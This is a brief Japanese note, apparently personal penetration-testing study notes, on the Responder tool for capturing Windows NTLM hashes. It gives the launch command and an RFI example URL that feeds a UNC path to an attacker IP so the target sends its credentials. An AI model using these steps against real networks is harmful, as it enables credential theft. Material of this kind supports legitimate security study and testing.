# Responderとは
Windowsの認証プロトコル（NTLM/SMB/LLMNR/mDNSなど）の脆弱性を悪用し、  
ネットワーク上で送信される認証情報（特にハッシュ）をキャプチャするために広く使われる、オープンソースのセキュリティツール。

## 起動
```bash
sudo responder -I <インターフェース>
```

## RFI
WindowsであればUNCパス(`//<ターゲット>/anyfile`)を指定するとResponderで立ち上げたサーバーに接続することがある。  
`https://test.com/test.php?params=//<攻撃者のIP>/anyfile`
